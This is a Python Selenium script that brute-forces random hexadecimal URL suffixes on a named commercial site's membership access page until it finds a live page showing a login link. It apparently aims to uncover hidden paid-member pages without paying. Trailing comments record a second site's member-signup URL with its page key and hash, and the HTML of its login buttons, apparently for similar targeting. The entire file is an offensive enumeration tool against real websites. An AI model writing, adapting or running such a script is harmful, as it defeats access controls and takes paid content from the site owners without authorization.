from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import selenium.webdriver as webdriver
from pprint import pprint
import time, os, binascii

PATH = Service(executable_path="/usr/bin/chromedriver")
DRIVER = webdriver.Chrome(service = PATH)

denom = 16**11
tries = 0

while(True):
  tail = str(binascii.b2a_hex(os.urandom(15)))[2:13]
  base = "https://www.taxsaleinvesting.com/membership-access-page/"
  addr = base + tail
  DRIVER.get(addr)
  try:
    DRIVER.find_element(by=By.PARTIAL_LINK_TEXT, value="Login Now!")
    print(addr)
    break
  except Exception:
    tries += 1
    if(not tries % 100):
      print(100 * 3 * tries / denom)
    continue


# https://www.taxsaleinvesting.com/membership-access-page/abcdef01234
# https://www.ninetonoonsecrets.com/members-signup1?page_id=30289884&page_key=91z4f7sluaoaa3kt&login_redirect=1
# https://www.ninetonoonsecrets.com/members-signup1?page_id=30289884&page_key=91z4f7sluaoaa3kt&page_hash=9c77ef59069&login_redirect=1

# <span data-cf-id="login-button-text" data-cf-note="button text" data-cf-editable-type="text" class="memberLoginButton">LOGIN TO ACCOUNT</span>
# <span data-cf-id="create-button-text" data-cf-note="button text" data-cf-editable-type="text" class="memberRegisterButton">CREATE YOUR ACCOUNT</span>